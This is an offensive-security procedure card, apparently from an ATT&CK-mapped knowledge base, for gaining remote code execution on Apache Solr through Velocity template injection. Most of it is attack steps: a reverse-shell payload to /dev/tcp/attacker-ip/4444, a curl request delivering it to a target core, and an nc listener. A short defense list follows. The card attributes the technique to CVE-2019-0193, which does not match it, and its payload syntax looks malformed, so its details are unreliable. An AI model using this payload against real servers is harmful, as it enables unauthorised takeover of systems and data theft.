---
id: proc-solr-execute-rce
tags:
  - rce
  - solr
  - cve-2019-0193
  - velocity-injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:36.717Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Execute-Arbitrary-Code-via-Solr-RCE

## Summary

This procedure exploits the updated Solr configuration using CVE-2019-0193 to inject and execute arbitrary code via Velocity templates, achieving remote code execution and shell access.

## Description

With Velocity enabled, attackers send a SELECT query with a custom template parameter containing Java Runtime execution, such as spawning a reverse shell. This targets the /select endpoint of the modified core and requires prior config update. In vulnerable Solr 5.5.1, this leads to server-side code execution without authentication.

## Requirements

1. Updated core configuration from previous procedure
2. Attacker-controlled listener for reverse shell (e.g., netcat on port 4444)
3. URL-encoded payload for Velocity injection

## Defense

Defensive measures and detection strategies:

- Patch Solr to versions beyond 5.5.5
- Disable VelocityResponseWriter explicitly
- Monitor for suspicious SELECT queries with velocity params and anomalous process spawns

## Objectives

1. Inject Velocity template with code execution
2. Achieve RCE on the server
3. Obtain interactive shell access

## Instructions

### Step 1: Craft Velocity Payload

**Context**: Encode the payload for Java Runtime exec, e.g., reverse shell.

Prepare the template string for injection.

```bash
PAYLOAD='{"$ {x} " : "exec(@java.lang.Runtime@getRuntime().exec(\'bash -i >& /dev/tcp/attacker-ip/4444 0>&1\'))"}'
ENCODED=$(echo -n $PAYLOAD | jq -sRr @uri)
```

> This URL-encodes the payload; replace attacker-ip with your IP.

### Step 2: Send Injection Query

**Context**: POST or GET the query to trigger execution.

Execute the curl request to the select endpoint.

```bash
curl -k 'https://target/solr/targetcore/select/?q=*:*&wt=velocity&v.template.custom=#set($x="%7B%7B%22%7D%7D")&v.template=$ENCODED'
```

> Expected output: Code runs silently; check listener for shell connection.

### Step 3: Interact with Shell

**Context**: Receive and stabilize the reverse shell.

On attacker side:

```bash
nc -lvnp 4444
```

> Successful execution connects a bash shell; upgrade with Python for stability if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[solr]]
- [[cve-2019-0193]]
- [[velocity-injection]]
- [[web]]
